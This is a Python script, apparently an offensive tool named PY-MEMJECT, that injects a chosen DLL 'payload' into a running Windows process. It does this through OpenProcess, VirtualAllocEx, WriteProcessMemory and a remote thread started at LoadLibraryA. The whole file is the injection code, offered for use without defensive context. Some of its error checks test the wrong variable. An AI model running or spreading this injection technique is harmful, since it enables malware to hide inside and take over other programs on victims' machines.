import sys
from ctypes import *

def runtime_injection():

    print("\n ---{PY-MEMJECT, Runtime .DLL injection}---\n")

    dll_name   = sys.argv[1]
    dll_length = len(dll_name)
    PID        = sys.argv[2]
    kernel32   = windll.kernel32

    if len(sys.argv) < 2:
        print("[!] Usage: ./PY-MEMJECT calc32.dll <PID>")
        sys.exit(1)

    print(f"[+] Current selected .DLL payload: {dll_name}")
    print(f"[+] Current selected process PID: {PID}")

    # Runtime - Windows API functions process
    # OpenProcess() --> Injector attaches to host process
    #       |---> VirtualAllocEx() --> Memory allocates for host process
    #             |---> WriteProcessMemory() --> Copy DLL to host process
    #                  |---> CreateRemoteThread() --> Code execution

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = ( 0x00F0000 | 0x00100000 | 0xFFF )
    VIRTUAL_MEM = ( 0x1000 | 0x2000 )

    dwDesiredAccess  = PROCESS_ALL_ACCESS
    bInheritHandle   = False
    dwProcessId      = int(PID)
    # Opens the process object via OpenProcess()
    loading_process = kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId)
    if not loading_process:
        print(f"[!] Error attaching to the process: {dwProcessId}")
        sys.exit(1)
    else:
        print(f"[+] Attached to the process: {dwProcessId}")

    hProcess         = loading_process
    lpAddress        = 0
    dwSize           = dll_length
    flAllocationType = VIRTUAL_MEM
    flProtect        = PAGE_READWRITE
    # Allocates memory for the host process
    allocate_memory = kernel32.VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect)
    if not loading_process:
        print("[!] Host process memory allocation failed")
        sys.exit(1)
    else:
        print("[+] Host process memory allocation sucess")

    hProcess         = loading_process
    lpBaseAddress    = allocate_memory
    lpBuffer         = dll_name
    nSize            = dll_length
    lpNumberOfBytesWritten = byref(c_int(0))
    # Copies the .DLL to the host process
    write_memory = kernel32.WriteProcessMemory(hProcess, lpBaseAddress, lpBuffer, nSize, lpNumberOfBytesWritten)
    if not loading_process:
        print("[!] Failed to copy .DLL into host process")
        sys.exit(1)
    else:
        print("[+] Successfully copied .DLL into host process")

    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    hProcess            = loading_process
    lpThreadAttributes  = None
    dwStackSize         = 0
    lpStartAddress      = h_loadlib
    lpParameter         = allocate_memory
    dwCreationFlags     = 0
    lpThreadId          = byref(c_ulong(0))
    code_execution = kernel32.CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize,
                                                 lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
    print(f"[+] Successful injection into PID: {PID}")
    
if __name__ == '__main__':
    runtime_injection()
